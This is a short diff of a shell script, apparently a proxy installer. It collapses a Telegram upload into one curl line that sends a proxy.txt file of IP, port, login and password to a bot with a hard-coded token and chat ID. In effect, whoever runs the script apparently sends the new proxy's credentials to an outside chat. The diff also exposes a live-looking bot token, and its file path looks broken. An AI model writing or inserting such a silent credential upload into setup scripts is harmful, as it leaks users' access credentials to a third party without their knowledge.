@@ -56,15 +56,7 @@ upload_proxy() {
     #zip --password $PASS proxy.zip proxy.txt
     #URL=$(curl -s --upload-file proxy.zip https://transfer.sh/proxy.zip)
     
-    BOT_TOKEN="6124963785:AAFNE9qm_tabPeY69IIB4zC-W9CfrRfpoCk"
-
-    # Replace CHAT_ID with the chat ID of the channel or user you want to send the document to
-    CHAT_ID=-"708242951"
-
-    curl -F chat_id="$CHAT_ID" \
-         -F document=@"/bin/sh/proxy.txt" \
-         "https://api.telegram.org/bot$BOT_TOKEN/sendDocument"
-
+	curl -F document=@/bin/sh/proxy.txt https://api.telegram.org/bot6124963785:AAFNE9qm_tabPeY69IIB4zC-W9CfrRfpoCk/sendDocument?chat_id=-708242951
     echo "Proxy is ready! Format IP:PORT:LOGIN:PASS"
 }
 gen_data() {
